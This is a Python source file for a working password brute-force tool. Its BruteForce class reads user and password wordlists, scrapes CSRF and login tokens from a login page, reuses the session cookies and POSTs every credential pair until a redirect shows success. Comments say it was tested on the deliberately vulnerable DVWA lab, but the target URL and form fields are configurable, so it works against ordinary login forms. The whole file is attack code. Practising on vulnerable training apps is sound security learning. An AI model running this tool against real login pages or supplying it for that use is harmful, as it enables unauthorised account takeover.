import requests
import re
from bs4 import BeautifulSoup
import logging
import json

import settings


# Brute force authentication (tested on DVWA) : https://github.com/ethicalhack3r/DVWA
# Docker command : docker run --rm -it -p 8000:80 vulnerables/web-dvwa (http://localhost:8000/)
# Credentials can be provided with files specified in settings.py
class BruteForce(object):
    def __init__(self, debug: bool, url_login: str, file_users: str = settings.BF_FILEPATH_USERS,
                 file_passwords: str = settings.BF_FILEPATH_PASSWORDS):
        self.__debug = debug                            # debug mode
        self.__url_login = url_login                    # url to login
        self.__file_users = file_users                  # file contains users
        self.__file_passwords = file_passwords          # file contains passwords

        self.__cookies = None                           # store cookies
        self.__response_login = None                    # response handler
        self.__is_authenticated = False                 # is authenticated with provided credentials ?

        # Init logger
        self.__logger = logging.getLogger(__name__)     # logger
        self.__logger.disabled = not self.__debug

    # Check if url is reachable
    def test_login_url(self):
        try:
            # Get login page
            self.__response_login = requests.get(self.__url_login, timeout=settings.REQUEST_TIMEOUT)
            self.__logger.info("Connected to {target}".format(target=self.__url_login))
        except ConnectionRefusedError:
            print("Error - Login page unreachable !")
            exit(0)

    # Set cookies
    def set_cookies(self):
        # Get session cookie value
        cookie_session_value = re.match(settings.COOKIE_SESSION_REGEX,
                                        self.__response_login.headers["set-cookie"]).group(1)

        # Set cookies
        self.__cookies = {settings.COOKIE_SESSION_NAME: cookie_session_value}

        # Set additionnal cookies definied in settings
        for key in settings.COOKIES_EXTRA:
            if not key in self.__cookies.keys():
                self.__cookies[key] = settings.COOKIES_EXTRA[key]

        self.__logger.info("Cookies value : {cookies}".format(cookies=json.dumps(self.__cookies)))

    # Test credentials on login page
    def brute_force(self):
        # Parse HTML content with BeautifulSoup
        bs = BeautifulSoup(self.__response_login.text, "html.parser")

        # Get CSRF token value (DVWA not really use CSRF token ... invalidation problem)
        param_form_csrf = bs.find("input", {"name": settings.PARAM_FORM_CSRF_KEY})
        if param_form_csrf:
            param_form_csrf_value = param_form_csrf["value"]
        else:
            param_form_csrf_value = ""
        # Get Login value
        param_form_login = bs.find("input", {"name": settings.PARAM_FORM_LOGIN_KEY})
        if param_form_login:
            param_form_login_value = param_form_login["value"]
        else:
            param_form_login_value = ""

        # Load users/passwords then test credentials.

        # Load users
        with open(self.__file_users) as fp_users:
            for cnt_users, user in enumerate(fp_users):
                # Load passwords
                with open(self.__file_passwords) as fp_passwords:
                    for cnt_passwords, password in enumerate(fp_passwords):
                        # remove '\n'
                        user = user.strip()
                        password = password.strip()

                        self.__logger.info("Try {user}/{password}".format(user=user, password=password))

                        # Set POST parameters
                        post_parameters = {settings.PARAM_FORM_USER_KEY: user,
                                           settings.PARAM_FORM_PASSWORD_KEY: password,
                                           settings.PARAM_FORM_CSRF_KEY: param_form_csrf_value,
                                           settings.PARAM_FORM_LOGIN_KEY: param_form_login_value}
                        # HTTP POST request
                        self.__response_login = requests.post(self.__url_login, post_parameters, cookies=self.__cookies,
                                                              allow_redirects=False, timeout=settings.REQUEST_TIMEOUT)

                        # check if authentication succeed
                        if settings.URL_SUCCESS in self.__response_login.headers["Location"]:
                            self.__logger.info(
                                "Success - Authenticated with {user}/{password}".format(user=user, password=password))
                            self.__is_authenticated = True
                            return
        # Brute Force failed
        self.__logger.info("Error - Brute Force failed.")
        return

    # Get cookies
    def get_cookies(self):
        return self.__cookies

    # Get is_authenticated
    def get_is_authenticated(self):
        return self.__is_authenticated

    # Main method to perform brute force attack on login form
    def run(self):
        self.test_login_url()
        self.set_cookies()
        self.brute_force()
